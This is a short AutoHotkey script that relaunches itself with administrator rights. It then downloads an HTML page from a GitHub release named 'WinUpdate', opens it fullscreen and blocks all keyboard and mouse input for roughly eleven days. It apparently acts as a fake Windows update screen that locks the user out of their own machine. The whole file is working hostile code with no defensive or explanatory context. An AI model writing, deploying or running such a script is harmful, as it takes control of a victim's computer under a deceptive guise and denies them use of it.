#SingleInstance, Force

If (A_IsAdmin) {
    UrlDownloadToFile, https://github.com/Lartrax/WinUpdate/releases/download/v1.0.0/windows.html, windows.html

    Sleep, 1000

    Run, windows.html 

    Sleep, 1000

    Send, {F11}

    BlockInput, On

    Sleep, 1000000000

    BlockInput, Off

    ExitApp
}
Else {
    Run *RunAs "%A_ScriptFullPath%"
    ExitApp
}
ExitApp